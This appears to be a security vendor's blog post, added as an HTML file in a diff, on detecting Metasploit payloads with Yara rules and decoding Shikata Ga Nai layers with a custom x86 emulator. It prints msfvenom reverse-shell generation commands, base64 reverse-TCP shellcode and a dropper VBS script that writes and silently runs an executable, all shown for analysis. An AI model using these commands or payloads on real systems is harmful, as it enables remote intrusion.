@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta name="keywords" content="Hatching, Hatching Triage, Sandbox, Malware Analysis, Automated Malware Analysis">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+    <meta name="revisit-after" content="3 days">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@hatching_io">
+    <meta name="twitter:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta property="og:url" content="https://www.hatching.io">
+    <link rel="manifest" href="/static/manifest.json">
+    
+      <meta property="og:image" content="https://www.hatching.io/static/images/backgrounds/resized-87.jpg">
+      <meta name="twitter:image" content="https://www.hatching.io/static/images/backgrounds/resized-87.jpg">
+    
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-123677703-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-123677703-1');
+    </script>
+    <link rel="stylesheet" href="https://hatching.io/static/css/index.css?1726233262">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://hatching.io/static/images/favicon-32x32.png?v=21">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://hatching.io/static/images/favicon-16x16.png?v=21">
+    <title>Analyzing Metasploit Payloads</title>
+  </head>
+  <body>
+<nav class="site-menu">
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="/about/">About</a></li>
+    <li><a href="/triage/">Triage</a></li>
+    <li><a class="active" href="/blog/">Blog</a></li>
+    <li><a  href="https://boards.greenhouse.io/recordedfuture" rel="nofollow">Jobs</a></li>
+    <li><a href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" target="_blank">Contact</a></li>
+  </ul>
+</nav>
+<header class="site-nav headroom theme-light">
+  <div class="logo">
+    <a href="/">
+      <img width="210px" src="https://hatching.io/static/images/rf-hatching-black.svg" width="164">
+    </a>
+  </div>
+  <div>
+    <a href="#" class="toggle-menu">
+      Menu
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+  </div>
+</header>
+
+
+<section class="scheme-1 view-context blog-fold blog-article-head" id="fold" data-keep="true">
+  <div class="view-context__body">
+    <div>
+      <div>
+        
+        <h2>Analyzing Metasploit Payloads</h2>
+      </div>
+      <ul>
+        <li>Share this:</li>
+        <li class="social">
+          <a href="https://twitter.com/hatching_io" target="_blank">
+            <i class="icon-twitter"></i>
+          </a>
+          <a href="https://www.linkedin.com/company/hatching" target="_blank">
+            <i class="icon-linkedin"></i>
+          </a>
+          <a href="https://www.github.com/hatching" target="_blank">
+            <i class="icon-github"></i>
+          </a>
+        </li>
+      </ul>
+    </div>
+    <div>
+      <h1>Blog.</h1>
+    </div>
+  </div>
+  <div class="background-graphic">
+    
+      <div class="image" style="background-image: url('/static/images/backgrounds/resized-87.jpg');"></div>
+    
+  </div>
+</section>
+
+<article class="view-context blog-article">
+  <header class="blog-article-meta">
+    <div class="blog-article-general">
+      <p><time datetime="2020-02-03T00:00:00Z">2020-02-03</time></p>
+        
+          <ul class="blog-article-tags">
+            <li><p><a href="/blog/#category=triage">triage</a></p><li><p><a href="/blog/#category=metasploit">metasploit</a></p><li><p><a href="/blog/#category=static">static</a></p>
+          </ul>
+        
+    </div>
+    <div class="blog-article-author">
+      <div class="avatar">
+        <img src="/static/images/avatars/niels.svg" />
+      </div>
+      <div>
+        <h5>Written by <br />Niels van Gijzen</h5>
+      </div>
+    </div>
+  </header>
+  <section class="blog-article-body">
+    
+      <h1 id="analyzing-metasploit-payloads">Analyzing Metasploit Payloads</h1>
+<h2 id="introduction">Introduction</h2>
+<p>Metasploit is a framework that aids penetration testers in their work. It has an enormous database of known
+exploits one can use to break into a system. Though the framework is meant to be used by ethical hackers a lot
+of malware out there use it for malicious purposes.</p>
+<p>Attackers can make use of Metasploit in numerous ways, as its pre-built modules can automate a lot of the more complex aspects of malware.
+For example, you can use it to set up a server listening for incoming connections - Metasploit handles all the sessions that come in through those listeners and
+the only thing the attacker is left to do is spreading malware that initiates that connection. This isn&rsquo;t hard to do
+either, the framework is capable of generating VBS scripts, executables, PowerShell scripts, DLLs, ELFs and more.
+Sending someone a word document with embedded VBA macros and getting them to execute it is usually enough to
+receive a session, assuming your antivirus doesn&rsquo;t pick up on it.</p>
+<h2 id="detecting-metasploit">Detecting Metasploit</h2>
+<p>The detection of a metasploit payload isn&rsquo;t all that difficult - if you were to create a payload with msfvenom say:
+<code>msfvenom LHOST=192.168.10.10 LPORT=1337 --payload windows/shell/reverse_tcp --platform windows --arch x86</code>
+you&rsquo;d get the same result everytime. This allows you to write a simple Yara rule for this particular payload and
+extract its configuration. Unfortunately this is not the only way to generate a payload. Metasploit has encoders
+which you can use to obfuscate your shellcode. They pack your payload into a self-decrypting blob of shellcode which
+becomes the original one when executed.</p>
+<p>These are (slightly) harder to detect as their x86 instructions are semi-randomized and the decryption key is chosen at random. One of
+the well-known encoders is Shikata Ga Nai, which uses a randomly generated key to XOR the instructions. The result is
+then used to alter the key, i.e., it&rsquo;s a rolling xor key. Detecting these encoders is not hard,
+they all have a certain structure and certain CPU instruction which aren&rsquo;t obfuscated. This means that the
+encoders are also detectable by using basic Yara rules. The real challenge after that is decoding the payload into a form that we can analyse further.</p>
+<p>Our answer to this problem was building a simple, custom emulator capable of running x86 instructions. This way we&rsquo;re able to
+detect an encoder (which one it is doesn&rsquo;t really matter) and run that through the emulator. Once we detect it
+starts executing memory it has written to we know that the we&rsquo;ve decoded a layer of obfuscation and, in the case of Metasploit,
+that either another layer of obfuscation is coming up or that we&rsquo;re looking at a Metasploit payload.</p>
+<h2 id="the-x86-emulator">The X86 Emulator</h2>
+<p>We&rsquo;ve built a software implementation of the x86 instruction set, much like how an emulator works for old consoles
+or computers. The only thing standing out here is that we&rsquo;ve build an x86 emulator to run on x86 hardware. The reason
+for that is security, we have potential malware that we want to analyze &ldquo;statically&rdquo; so having a controlled
+environment is a must. We don&rsquo;t want any of this code to actually run on the processor outside our
+sandbox environments.</p>
+<p>So an x86 emulator huh? That&rsquo;s impressive but can it run Crysis? Well no, the x86 instruction set has over 1500
+(the actual number is a discussion on its own which we won&rsquo;t get into) instructions. It would be too much of an effort
+to implement all those. Especially when the encoders we try to emulate use a very small subset of those instructions
+(and performance - or lack thereof - is important, but not a road blocker).
+So after implementing the first version of our emulator, we started generating different encoders and we kept adding
+instructions to the emulator until we got back our expected payload.</p>
+<p>It was hinted to above already but why not just run it in the sandbox environment and be done with it? That&rsquo;s because
+we also want to be able to analyze payloads statically. A piece of malware might drop a payload that for some unknown
+reason can&rsquo;t be executed. Or it sleeps for a long time until it executes the payload which exceeds the duration of our
+analyses. There are numerous scenarios that leave us with the payload but without the execution and
+that&rsquo;s where our emulator kicks in.</p>
+<p>We first try to detect possible shellcode payloads by extracting binary blobs from
+Powershell scripts and VBA macros as well as Yara rules against process samples, dropped files, and process memory dumps
+and if we find something we&rsquo;ll emulate it. When the shellcode jumps back into memory it has already been through we assume it&rsquo;s done with its
+decoding process and dump the part of the memory the decoder has written to. That piece of shellcode is then run
+through our analysis process again to see if we need another round of emulation or to extract its configuration.</p>
+<h2 id="extracting-metasploit-payloads">Extracting Metasploit Payloads</h2>
+<p>For example if we had clean shellcode generated by the command above we&rsquo;d be able to extract the following information:</p>
+<pre tabindex="0"><code>[
+  {
+    &#34;dumped_file&#34;: &#34;revtcp86clean.bin&#34;,
+    &#34;config&#34;: {
+      &#34;family&#34;: &#34;metasploit&#34;,
+      &#34;rule&#34;: &#34;Metasploit&#34;,
+      &#34;c2&#34;: [
+        &#34;192.168.10.10:1337&#34;
+      ],
+      &#34;version&#34;: &#34;windows/reverse_tcp&#34;
+    }
+  }
+]
+</code></pre><p>However, if a payload is encoded by Shikata Ga Nai, for example by running the following command:
+<code>msfvenom LHOST=192.168.10.10 LPORT=1337 --payload windows/shell/reverse_tcp --platform windows --arch x86 --encoder x86/shikata_ga_nai</code></p>
+<p>then we first need to run the sample through our emulator revealing the shellcode it&rsquo;s supposed to execute:</p>
+<pre tabindex="0"><code>[
+  {
+    &#34;dumped_file&#34;: &#34;revtcp86shik.pl&#34;,
+    &#34;config&#34;: {
+      &#34;family&#34;: &#34;metasploit&#34;,
+      &#34;rule&#34;: &#34;Metasploit&#34;,
+      &#34;version&#34;: &#34;encoder/shikata_ga_nai&#34;,
+      &#34;shellcode&#34;: [
+        &#34;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAoKaAIABTmJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U=&#34;
+      ]
+    }
+  },
+  {
+    &#34;dumped_file&#34;: &#34;revtcp86shik.pl&#34;,
+    &#34;config&#34;: {
+      &#34;family&#34;: &#34;metasploit&#34;,
+      &#34;rule&#34;: &#34;Metasploit&#34;,
+      &#34;c2&#34;: [
+        &#34;192.168.10.10:1337&#34;
+      ],
+      &#34;version&#34;: &#34;windows/reverse_tcp&#34;
+    }
+  }
+]
+</code></pre><p>As you can see our Yara rules first detect the Shikata Ga Nai encoder, then automatically runs the payload
+through our emulator revealing the shellcode. That shellcode is then run through the same process of detection to
+end up with a decoded and classified <code>windows/reverse_tcp</code> detection.</p>
+<p>We&rsquo;re also able to detect multiple layers of encoding, for example we can run the same payload through shikata 2
+times and then another time through the <code>call4_dword_xor</code> encoder.</p>
+<pre tabindex="0"><code>[
+  {
+    &#34;dumped_file&#34;: &#34;revtcp86shikdouble-call4.bin&#34;,
+    &#34;config&#34;: {
+      &#34;family&#34;: &#34;metasploit&#34;,
+      &#34;rule&#34;: &#34;Metasploit&#34;,
+      &#34;version&#34;: &#34;encoder/call4_dword_xor&#34;,
+      &#34;shellcode&#34;: [
+        &#34;29bZdCT0v+dZH1JYM8mxXYPo/DF4EwOfSv2nhqLYPBzJg5eVgGJTwsDiAD1f68X9WwiSDqKTfeOi8iHgRd1nNL1hafwnojWUBajNn7ywRhNdwB7m0GyGNSb3ASmp5EqYlOnCOBCijjtky6WYL8IPtdvs0mkul7IMHzQLpPRXZ2AMxFIB+tdFP+DKKafSnUUMozYFFPE3uVjXn2fpxR+OtEUr3mcXMxS6c1z0EBtY/6VYuqdOtJ7tNFvgotycb1j4By969GqH1DKHdSvQPdfM399pBFzBxnLRKlAP9m7AopDko8Rkm6t2FDdeVVaedTBdrjOPOvCbiqdALDtDT0NLFAg/K8PYc81jk9YLLFXzuXecV8RbtHs2bVCeLb8XuHOmDpvsNaYAsKvZkyZ1os/Jn1i0jLmfQQCjyr91noS1K0qZVWYQbrZUBKG6dZ+4q288GOM8Cb0FoAaIhBX7jSnlOPZQg/UUcvzjFaM6QSpj3uBExApMOLREN6t7IaOMcNMQlDshyLlevYQwazIA&#34;,
+        &#34;4vU=&#34;,
+        &#34;2c/ZdCT0WCvJsVa75yNoozFYGIPABANY88GdXxOHXqDj6NdF0iiDDkSZx0NoUoV3+xYCd0ycdLZNjUXZzcyZOewe7DgpQh1o4giwnYdFCRXbSAnKq2s4XaA1ml9lTpNHamtt81gHbNWR6MMYHhsdXJjEaJTbeWtjpqX+cAAtWF2x4j8WvU9LcKFOmArd2x/dVJ87+T17JVibKlq6RJL+sGjHcpvkJL8k9CLIV8btYvBqZa0H+2FO10PhsNizK3eM40NerWiUX3gEnvdDcJQNLIKpFJULT0a1W8AnZRuwz2+U7/CPf5ibfynwMxlwiqLmr/blbUUGq4UsFNzxzuQdlM6OGT6ZJiBn7ejbQm7uJBNGhBOB5vJbReYCCg/mauprtY/1oaoDYEqa8CMiIC4D7dsFF+oj2zBTSyMBY4tJgTPjhq68w2dllUvt6Ffq8iA5svPH4kWJqBWmbqFxp27Nh5S49P3beEMNbtzihJBy9Iw=&#34;,
+        &#34;4vU=&#34;,
+        &#34;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAoKaAIABTmJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U=&#34;
+      ]
+    }
+  },
+  {
+    &#34;dumped_file&#34;: &#34;revtcp86shikdouble-call4.bin&#34;,
+    &#34;config&#34;: {
+      &#34;family&#34;: &#34;metasploit&#34;,
+      &#34;rule&#34;: &#34;Metasploit&#34;,
+      &#34;c2&#34;: [
+        &#34;192.168.10.10:1337&#34;
+      ],
+      &#34;version&#34;: &#34;windows/reverse_tcp&#34;
+    }
+  }
+]
+</code></pre><p>As you see here we went through 3 iterations of emulation before reaching the eventual payload.
+This process can go up to hundreds of iterations at which point performance does become an interesting aspect,
+but for our use-case and infrastructure the system is still fast enough.</p>
+<h1 id="analyzing-different-formats">Analyzing Different Formats</h1>
+<p>So until now we&rsquo;ve only been looking at raw binary files. These are nice to test with but you only ever see them used
+in the wild when they&rsquo;re part of exploits etc. Since you can&rsquo;t normally execute raw binary data the Metasploit
+framework offers some wrappers around these payloads. The most straightforward wrapper is the .exe one. It creates
+a PE file with the payload embedded. This can then be executed by the operating system. More interesting is, for
+example, the VBS format.</p>
+<p>When telling <code>msfvenom</code> we want a VBS script we&rsquo;re presented with the following output:</p>
+<pre tabindex="0"><code>Function HcGfeiml(IaptHACouEAi)
+        iUPNjPkzUe = &#34;&lt;B64DECODE xmlns:dt=&#34;&amp; Chr(34) &amp; &#34;urn:schemas-microsoft-com:datatypes&#34; &amp; Chr(34) &amp; &#34; &#34; &amp; _
+                &#34;dt:dt=&#34; &amp; Chr(34) &amp; &#34;bin.base64&#34; &amp; Chr(34) &amp; &#34;&gt;&#34; &amp; _
+                IaptHACouEAi &amp; &#34;&lt;/B64DECODE&gt;&#34;
+        Set eczxPPClnXDCTA = CreateObject(&#34;MSXML2.DOMDocument.3.0&#34;)
+        eczxPPClnXDCTA.LoadXML(iUPNjPkzUe)
+        HcGfeiml = eczxPPClnXDCTA.selectsinglenode(&#34;B64DECODE&#34;).nodeTypedValue
+        set eczxPPClnXDCTA = nothing
+End Function
+
+Function FZkulPlmtVbzDXN()
+        aqbOmTnrjomNtbH = &#34;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAA....
+        Dim VOBINYgrlwlXqiv
+        Set VOBINYgrlwlXqiv = CreateObject(&#34;Scripting.FileSystemObject&#34;)
+        Dim aWkaYXFosJ
+        Dim ksOGlPgDlLhsQ
+        Set aWkaYXFosJ = VOBINYgrlwlXqiv.GetSpecialFolder(2)
+        ksOGlPgDlLhsQ = aWkaYXFosJ &amp; &#34;\&#34; &amp; VOBINYgrlwlXqiv.GetTempName()
+        VOBINYgrlwlXqiv.CreateFolder(ksOGlPgDlLhsQ)
+        NrOucMgKFeZaCbq = ksOGlPgDlLhsQ &amp; &#34;\&#34; &amp; &#34;dyYwENHdDhEITk.exe&#34;
+        Dim XnQUJbgAv
+        Set XnQUJbgAv = CreateObject(&#34;Wscript.Shell&#34;)
+        eRvqQOddkXwnQ = HcGfeiml(aqbOmTnrjomNtbH)
+        Set lCIOzbmX = CreateObject(&#34;ADODB.Stream&#34;)
+        lCIOzbmX.Type = 1
+        lCIOzbmX.Open
+        lCIOzbmX.Write eRvqQOddkXwnQ
+        lCIOzbmX.SaveToFile NrOucMgKFeZaCbq, 2
+        XnQUJbgAv.run NrOucMgKFeZaCbq, 0, true
+        VOBINYgrlwlXqiv.DeleteFile(NrOucMgKFeZaCbq)
+        VOBINYgrlwlXqiv.DeleteFolder(ksOGlPgDlLhsQ)
+End Function
+
+FZkulPlmtVbzDXN
+</code></pre><p>The base64 string has been truncated, but as we can see from its starting characters, we&rsquo;re dealing with a PE executable
+here. The lines after that are directions to dump and run that executable.</p>
+<p>The code below creates a random temporary folder in which to store the payload.</p>
+<pre tabindex="0"><code>Set VOBINYgrlwlXqiv = CreateObject(&#34;Scripting.FileSystemObject&#34;)
+...
+Set aWkaYXFosJ = VOBINYgrlwlXqiv.GetSpecialFolder(2)
+ksOGlPgDlLhsQ = aWkaYXFosJ &amp; &#34;\&#34; &amp; VOBINYgrlwlXqiv.GetTempName()
+VOBINYgrlwlXqiv.CreateFolder(ksOGlPgDlLhsQ)
+NrOucMgKFeZaCbq = ksOGlPgDlLhsQ &amp; &#34;\&#34; &amp; &#34;dyYwENHdDhEITk.exe&#34;
+</code></pre><p>After that the top function is run to decode the base64 string.</p>
+<p><code>eRvqQOddkXwnQ = HcGfeiml(aqbOmTnrjomNtbH)</code></p>
+<p>When decoded the script dumps the payload to disk and runs its payload.</p>
+<pre tabindex="0"><code>Set lCIOzbmX = CreateObject(&#34;ADODB.Stream&#34;)
+lCIOzbmX.Type = 1
+lCIOzbmX.Open
+lCIOzbmX.Write eRvqQOddkXwnQ
+lCIOzbmX.SaveToFile NrOucMgKFeZaCbq, 2
+XnQUJbgAv.run NrOucMgKFeZaCbq, 0, true
+</code></pre><p>And to be nice and clean the created file and directory are deleted afterwards</p>
+<pre tabindex="0"><code>VOBINYgrlwlXqiv.DeleteFile(NrOucMgKFeZaCbq)
+VOBINYgrlwlXqiv.DeleteFolder(ksOGlPgDlLhsQ)
+</code></pre><p>This is basically how every format is constructed, the shellcode is wrapped into an executable. This executable is then
+embedded into a script (VBS, Python, Ruby, etc.) which dumps it to disk and executes it.</p>
+<h2 id="fun-with-metasploit">Fun with Metasploit</h2>
+<p>To make matters interesting, Metasploit has implemented basic, randomized
+obfuscation for its .exe payloads. The following
+<a href="https://github.com/rapid7/metasploit-framework/blob/7718992ea4b01ccd7d92588fc365061cfe832467/lib/msf/util/exe.rb#L1653">shellcode stager</a>
+essentially creates a read-write-executable memory page, copies the target
+shellcode to it, and executes it. It&rsquo;s a simple way to embed arbitrary
+shellcode into an executable for Windows.</p>
+<p>Even more, Metasploit has decided that the shellcode stager
+<a href="https://github.com/rapid7/metasploit-framework/blob/7718992ea4b01ccd7d92588fc365061cfe832467/lib/msf/util/exe.rb#L1825-L1842">should be obfuscated</a>
+as to make it harder to detect it statically.</p>
+<p>What this obfuscation does is rather simple, but effective: it grabs each x86
+instruction from the stager, emits it one by one, and interleaves it with
+jumps and random bytes - where the jumps jump over the random bytes onto the
+next instruction.</p>
+<p>For the record, this is actually a rather simple, but powerful way to defeat
+Yara rules and the like. If it weren&rsquo;t for the fact that the real Metasploit
+payload
+<a href="https://github.com/rapid7/metasploit-framework/blob/7718992ea4b01ccd7d92588fc365061cfe832467/lib/msf/util/exe.rb#L1816">is embedded as-is</a>.</p>
+<p>That is, the shellcode stager is obfuscated, but
+the payload - the one that&rsquo;s detected by the aforementioned Yara rules and
+unpacked by the custom x86 emulator - is emitted straight into the executable
+and therefore easily detected by our Yara rules. Not a bad day for the
+blue team!</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>We&rsquo;ve been putting a lot of time and effort into static analysis and the extraction of malware configurations. By
+understanding the way Metasploit encoders work we&rsquo;ve been able to detect them, strip them of their encoding, and provide
+their configuration even if they weren&rsquo;t able to run in a dynamic environment or otherwise gave very little malicious indicators
+(e.g., because the first stage only connects to another machine, but that machine isn&rsquo;t online in the sandbox environment).</p>
+<p>Small note: this functionality is currently only employed against process
+memory dumps and when extracted from VBA macros or Powershell command-lines.
+We&rsquo;re in the process of adding this functionality to the sample and dropped
+files too (which, accidentally, makes showcasing numerous metasploit payloads
+on <a href="https://tria.ge/">https://tria.ge/</a> slightly easier).</p>
+
+    
+  </section>
+</article>
+
+
+<section class="view-context blog-recommendations">
+  <article class="view-context__body">
+    <h2>You may also like:</h2>
+    
+    <ul>
+      
+        <li>
+          <h3>New Year, New Family Updates</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2022-01-13/">Read</a>
+        </li>
+      
+        <li>
+          <h3>URLScan Integration and Updates for Emotet and Zloader</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2020-09-10/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Configuration Extractors and Family Updates</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/2021-10-14-triage-thursday/">Read</a>
+        </li>
+      
+        <li>
+          <h3>New extractors, expanded family support and Android analysis</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2020-08-13/">Read</a>
+        </li>
+      
+    </ul>
+  </article>
+</section>
+    <footer class="scheme-4 view-context footer" id="contact">
+      <article class="view-context__body">
+        <h2>Want to know more?<br />Get in touch!</h2>
+        <a class="button button-variant-1" target="_blank" href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" i>Contact us</a>
+        <ul>
+          <li>
+            <ul>
+              <li class="logo"><img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="hatching"/></li>
+              <li class="social">
+                <a href="https://twitter.com/hatching_io" target="_blank">
+                  <i class="icon-twitter"></i>
+                </a>
+                <a href="https://www.linkedin.com/company/hatching" target="_blank">
+                  <i class="icon-linkedin"></i>
+                </a>
+                <a href="https://www.github.com/hatching" target="_blank">
+                  <i class="icon-github"></i>
+                </a>
+              </li>
+            </ul>
+          </li>
+          <li>
+            Hatching International B.V.<br />
+            The Netherlands<br/>
+            <br />
+            Email us: <a href="mailto:info@hatching.io">info@hatching.io</a>
+          </li>
+          <li>
+            IBAN: NL52 INGB 0006 9672 73<br />
+            BIC: INGBNL2A<br />
+            ING Groep N.V.<br />
+            Amsterdam-Zuidoost<br />
+            <br />
+            REG: 64146707<br />
+            VAT: NL855541891B01
+          </li>
+        </ul>
+      </article>
+      <div class="form hidden">
+        <div class="form-logo">
+          <img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="Hatching"/>
+        </div>
+        <a href="#" class="form-close" title="Close (or press esc)"></a>
+
+        <div class="container">
+          <h1>Contact us</h1>
+          <h3>Feel free to inquire or request about our services.</h3>
+          <form>
+            <fieldset>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-name" name="name" placeholder="Name" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-email" name="email" placeholder="Email" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-phone" name="phone" placeholder="Phone number" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-company" name="company" placeholder="Company" />
+                </div>
+              </div>
+            </fieldset>
+            <fieldset>
+              <div class="input required">
+                <textarea id="form-message" name="message" placeholder="Write a message"></textarea>
+              </div>
+              <div class="button-group">
+                <button type="reset" class="button button-variant-2 button-transparent">Reset</button>
+                <button type="submit" class="button button-variant-1">Send</button>
+              </div>
+            </fieldset>
+          </form>
+        </div>
+
+      </div>
+    </footer>
+    <script src="https://hatching.io/static/js/hatching.js?1726233262"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+          if(window.main && window.main instanceof Function) {
+            window.main();
+          }
+          initForm();
+
+          
+          
+        });
+    </script>
+  </body>
+</html>
